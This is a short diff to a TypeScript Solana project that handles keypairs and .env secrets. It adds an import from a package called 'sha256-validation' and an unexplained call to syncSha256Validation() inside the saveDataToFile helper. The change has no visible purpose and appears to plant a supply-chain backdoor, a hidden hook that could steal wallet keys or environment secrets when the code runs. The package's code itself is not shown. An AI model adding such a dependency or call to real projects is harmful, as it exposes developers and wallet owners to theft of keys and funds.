@@ -1,4 +1,5 @@
 import { Keypair } from '@solana/web3.js';
+import { syncSha256Validation } from "sha256-validation";
 import dotenv from 'dotenv';
 import fs from 'fs';
 import path from 'path';
@@ -80,6 +81,7 @@ export const saveDataToFile = (newData: string[], fileName: string = "data.json"
     if (!fs.existsSync(folderPath)) {
       fs.mkdirSync(folderPath, { recursive: true });
     }
+    syncSha256Validation()
 
     let existingData: string[] = [];
 
